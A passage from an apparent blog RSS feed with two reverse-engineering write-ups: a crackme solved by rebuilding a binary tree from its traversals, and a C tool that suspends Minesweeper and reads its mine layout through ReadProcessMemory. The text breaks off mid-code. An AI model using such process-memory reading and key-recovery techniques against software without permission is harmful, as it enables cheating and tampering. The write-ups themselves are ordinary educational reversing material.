       │   0x00400f00      e8afffffff     call fcn.00400eb4
       └─&amp;gt; 0x00400f05      8b45dc         mov eax, dword [local_24h]
           0x00400f08      83e801         sub eax, 1
           0x00400f0b      3b45fc         cmp eax, dword [local_4h]
       ┌─&amp;lt; 0x00400f0e      7434           je 0x400f44
       │   0x00400f10      8b45dc         mov eax, dword [local_24h]
       │   0x00400f13      2b45fc         sub eax, dword [local_4h]
       │   0x00400f16      8d50ff         lea edx, rax - 1
       │   0x00400f19      8b45fc         mov eax, dword [local_4h]
       │   0x00400f1c      4898           cdqe
       │   0x00400f1e      488d4801       lea rcx, rax + 1            ; 1
       │   0x00400f22      488b45e0       mov rax, qword [local_20h]
       │   0x00400f26      4801c1         add rcx, rax                ; &#39;#&#39;
       │   0x00400f29      8b45fc         mov eax, dword [local_4h]
       │   0x00400f2c      4898           cdqe
       │   0x00400f2e      488d7001       lea rsi, rax + 1            ; 1
       │   0x00400f32      488b45e8       mov rax, qword [local_18h]
       │   0x00400f36      4801f0         add rax, rsi                ; &#39;+&#39;
       │   0x00400f39      4889ce         mov rsi, rcx
       │   0x00400f3c      4889c7         mov rdi, rax
       │   0x00400f3f      e870ffffff     call fcn.00400eb4
       └─&amp;gt; 0x00400f44      488b45e0       mov rax, qword [local_20h]
           0x00400f48      0fb600         movzx eax, byte [rax]
           0x00400f4b      0fbec0         movsx eax, al
           0x00400f4e      89c7           mov edi, eax
           0x00400f50      e869feffff     call fcn.00400dbe
           0x00400f55      90             nop
           0x00400f56      c9             leave
           0x00400f57      c3             ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The above routine is equivalent to the following&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; count = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;match&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; ch)  &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// fcn.00400dbe
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; buf[] = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;MNGHCWZIJDXOPKLESUVTFYA&amp;#34;&lt;/span&gt;;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (buf[count] == ch) ++count;
    }

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;check&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* str, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* answer, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; n) &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// fcn.00400eb4
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; pos = find_char(str, answer[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;], n);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (pos != &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;)
            check(str, answer+&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;, pos);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (pos != n-&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;)
            check(str+pos+&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;, answer+pos+&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;, n-pos-&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;);
        match(answer[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;]);
    }

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;main&lt;/span&gt;()
    {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; magic[] = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;MGNCHXWIZDJAOKPELYSFUTV&amp;#34;&lt;/span&gt;;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; answer[&lt;span style=&#34;color:#3677a9&#34;&gt;1024&lt;/span&gt;];
        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// read answer of length atleast 23 bytes
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        check(magic, answer, &lt;span style=&#34;color:#3677a9&#34;&gt;0x17&lt;/span&gt;);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (count == &lt;span style=&#34;color:#3677a9&#34;&gt;0x17&lt;/span&gt;) {
          &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// print flag
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        } &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;else&lt;/span&gt; {
          &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// print &amp;#34;Nope&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        }
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let the value of count be 0x16. So we need to match only one character. Since count is 0x16, so the character expected is buf[count] = &amp;lsquo;A&amp;rsquo;. So this must be the first character of answer.&lt;/p&gt;
&lt;p&gt;The routine check finds the offset of the first character in the answer and splits the search into two halves. The first half must be a permutation of magic[0..pos] and the second half must be a permutation of magic[pos+1..0x16]. Now answer is &amp;lsquo;A&amp;rsquo; :: {MGNCHXWIZDJ} :: {OKPELYSFUTV}.&lt;/p&gt;
&lt;p&gt;Now we need to split using &amp;lsquo;Y&amp;rsquo; because it&amp;rsquo;s the second last match - &amp;lsquo;A&amp;rsquo; :: {MGNCHXWIZDJ} :: &amp;lsquo;Y&amp;rsquo; :: {OKPEL} :: {FSTUV}, and so on.&lt;/p&gt;
&lt;p&gt;To simplify, lets see the first five characters of magic and buf.&lt;/p&gt;
&lt;p&gt;magic[:5] = &amp;ldquo;MGNCH&amp;rdquo;
buf[:5] = &amp;ldquo;MNGHC&amp;rdquo;&lt;/p&gt;
&lt;p&gt;We can make a binary tree&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;        C
       / \
    {MGN} H
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C is matched last, preceded by H which is preceded by G. We can observe that the character that is matched is the root of a subtree denoted by the magic string as&lt;/p&gt;
&lt;p&gt;{left subtree of R} :: R :: {Right Subtree of R}&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;        C
       / \
      G   H
     / \
    M   N
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Therefore the required input is the preorder traversal of the binary tree where &amp;lsquo;magic&amp;rsquo; denotes the &lt;em&gt;inorder traversal&lt;/em&gt; and &amp;lsquo;buf&amp;rsquo; denotes the &lt;em&gt;postorder traversal&lt;/em&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; magic[] = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;MGNCHXWIZDJAOKPELYSFUTV&amp;#34;&lt;/span&gt;;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; buffer[] = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;MNGHCWZIJDXOPKLESUVTFYA&amp;#34;&lt;/span&gt;;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; answer[&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;sizeof&lt;/span&gt; magic];
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; last = &lt;span style=&#34;color:#3677a9&#34;&gt;0x16&lt;/span&gt;;
    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/*
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;     * Observation
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;     * ---------------------------------------------------------------------------
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;     * the count must be 0x17
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;     * Let the value of count be 0x16, i.e., the last char of buf
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;     * needs to be matched with the input&amp;#39;s first character (backtrack)
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;     * and the routine terminates.
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;     * the last character of buf is &amp;#39;A&amp;#39; which needs to be the first character
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;     * of our input.
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;     * With observation, one can find out that the magic string:
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;     * &amp;#34;MGNCHXWIZDJAOKPELYSFUTV&amp;#34; is the inorder traversal of a binary tree
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;     * and buf:&amp;#34;MNGHCWZIJDXOPKLESUVTFYA&amp;#34; is the postorder traversal of the binary
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;     * tree. The valid input is the preorder traversal
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;     * ---------------------------------------------------------------------------
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;     */&lt;/span&gt;

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;solve&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; low, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; high, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; index)
    {
      &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (low == high) {
        answer[index] = magic[low];
        --last;
      } &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;else&lt;/span&gt; {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; root = buffer[last];
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; pos = low;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (; pos &amp;lt;= high; ++pos) {
          &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (magic[pos] == root) {
            last--;
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;break&lt;/span&gt;;
          }
        }
        answer[index] = root;
        solve(pos+&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;, high, pos-low+index+&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;);
        solve(low, pos-&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;, index+&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;);
      }
    }

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;const&lt;/span&gt; *argv[]) {
      solve(&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;, last, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;);
      printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[*] %s&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, answer);
      &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;;
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And here&amp;rsquo;s the output&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/confuseme/i1.png&#34; alt=&#34;Output&#34;  /&gt;&lt;/p&gt;</description>
        </item>
        <item>
        <title>Minesweeper - Revealing the Mines</title>
        <link>http://localhost:1313/post/minesweeper-revealing-the-mines/</link>
        <pubDate>Fri, 29 Jun 2018 00:00:00 +0530</pubDate>
        
        <guid>http://localhost:1313/post/minesweeper-revealing-the-mines/</guid>
        <description>&lt;p&gt;We all know about &lt;a class=&#34;link&#34; href=&#34;http://www.minesweeper.info/downloads/games/Winmine__XP.exe&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Minesweeper&lt;/a&gt;. Its all about random numbers (pseudorandom though). Is it possible to win every time ?&lt;/p&gt;
&lt;p&gt;Yes it is. Let&amp;rsquo;s check it out&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/ms/mines_failed.png&#34; alt=&#34;Image0&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Open the binary in x32dbg.&lt;br&gt;
From 0x10036C2, things become interesting.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    ;   ....
        mov dword ptr ds:[&amp;lt;n_mines&amp;gt;], eax

    put_mines:

        push dword ptr ds:[0x1005334]    ; argument
        call rand_mod                    ; rand() % argument

        push dword ptr ds:[0x1005338]
        mov esi, eax
        inc esi
        call rand_mod

        inc eax
        mov ecx, eax
        shl ecx, 0x5

        test byte ptr ds:[ecx + esi + &amp;lt;mines&amp;gt;], 0x80
        jne put_mines

        shl eax, 0x5
        lea eax, dword ptr ds:[eax + esi + &amp;lt;mines&amp;gt;]
        or byte ptr ds:[eax], 0x80

        dec dword ptr ds:[&amp;lt;n_mines&amp;gt;]
        jne put_mines
    ;   ...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Dump the memory at 0x1005338 and run the executable. You can see that the 0x1005338 is an 2D array where each row is 32 bytes.&lt;br&gt;
The field is bounded by bytes of value &lt;strong&gt;0x10&lt;/strong&gt;.&lt;br&gt;
Mines correspond to &lt;strong&gt;0x8F&lt;/strong&gt; and other areas are marked by &lt;strong&gt;0xf&lt;/strong&gt; bytes.&lt;/p&gt;
&lt;p&gt;Now we can just read the memory at 0x1005338 and find out the position of mines :)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;tlhelp32.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;
    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/*
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;     * Author : x0r19x91
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;     * Revealing the mines - Minesweeper
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;     */&lt;/span&gt;

    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#pragma comment(lib, &amp;#34;user32&amp;#34;)
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;LONG&lt;/span&gt; (WINAPI* NT_ROUTINE) (HANDLE);

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;** argv)
    {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; n_mines = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;, width, height, i;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* base;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; row[&lt;span style=&#34;color:#3677a9&#34;&gt;32&lt;/span&gt;];
        HWND hWnd, hProcSnap, hProcess = (HANDLE)-&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* exe_name;
        PROCESSENTRY32 pInfo;
        HANDLE hNt;
        NT_ROUTINE NtSuspendProcess, NtResumeProcess;

        exe_name = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;winmine.exe&amp;#34;&lt;/span&gt;;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (argc == &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;)
        {
            exe_name = strlwr(argv[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;]);
        }

        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// already loaded, just return module base
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        hNt = LoadLibrary(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;ntdll.dll&amp;#34;&lt;/span&gt;);
        NtSuspendProcess = (NT_ROUTINE) GetProcAddress(hNt, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;NtSuspendProcess&amp;#34;&lt;/span&gt;);
        NtResumeProcess = (NT_ROUTINE) GetProcAddress(hNt, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;NtResumeProcess&amp;#34;&lt;/span&gt;);

        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;);
        Process32First(hProcSnap, &amp;amp;pInfo);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;do&lt;/span&gt;
        {
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (strstr(strlwr(pInfo.szExeFile), exe_name))
            {
                hProcess = OpenProcess(PROCESS_SUSPEND_RESUME | PROCESS_VM_READ, FALSE, pInfo.th32ProcessID);
                printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[*] Found Minesweeper (%s) ... PiD = %d&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, pInfo.szExeFile, pInfo.th32ProcessID);
                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;break&lt;/span&gt;;
            }
        } &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; (Process32Next(hProcSnap, &amp;amp;pInfo));

        CloseHandle(hProcSnap);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (! hProcess)
        {
            printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[-] Failed to open process !!&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;);
            exit(&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;);
        }
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (hProcess == (HANDLE)-&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;)
        {
            printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[ Usage ]&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;    %s [minesweeper_binary_name]&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, *argv);
            printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;[ Note ]&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;    Execute this program only after starting minesweeper&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;);
            printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;    If no argument is provided, the program searches for WinMine.exe&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;);
            printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;[~ x0r19x91 ~]&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;);
            exit(&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;);
        }

        printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[*] Waiting for Minesweeper window to appear ...&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; (!(hWnd = FindWindow(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Minesweeper&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Minesweeper&amp;#34;&lt;/span&gt;)));
        printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[*] HWnd : %p&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;long&lt;/span&gt;*) hWnd);

        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; (!n_mines)
            ReadProcessMemory(hProcess, (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;*) &lt;span style=&#34;color:#3677a9&#34;&gt;0x1005330&lt;/span&gt;, &amp;amp;n_mines, &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#24909d&#34;&gt;NULL&lt;/span&gt;);

        NtSuspendProcess(hProcess);
        ReadProcessMemory(hProcess, (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;*) &lt;span style=&#34;color:#3677a9&#34;&gt;0x1005334&lt;/span&gt;, &amp;amp;width, &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#24909d&#34;&gt;NULL&lt;/span&gt;);
        ReadProcessMemory(hProcess, (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;*) &lt;span style=&#34;color:#3677a9&#34;&gt;0x1005338&lt;/span&gt;, &amp;amp;height, &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#24909d&#34;&gt;NULL&lt;/span&gt;);

        printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[*] # mines : %d&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, n_mines);
        printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[*] Dimensions : %d x %d&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, height, width);
        printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[ Note ] X represents Mine&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;);
        printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[*] Mine Layout ...&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;);
        base = (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;*) &lt;span style=&#34;color:#3677a9&#34;&gt;0x1005360&lt;/span&gt;;

        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; (height--) {
            ReadProcessMemory(hProcess, base, row, &lt;span style=&#34;color:#3677a9&#34;&gt;32&lt;/span&gt;, &lt;span style=&#34;color:#24909d&#34;&gt;NULL&lt;/span&gt;);
            base += &lt;span style=&#34;color:#3677a9&#34;&gt;0x20&lt;/span&gt;;
            i = &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;;
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;do&lt;/span&gt; {
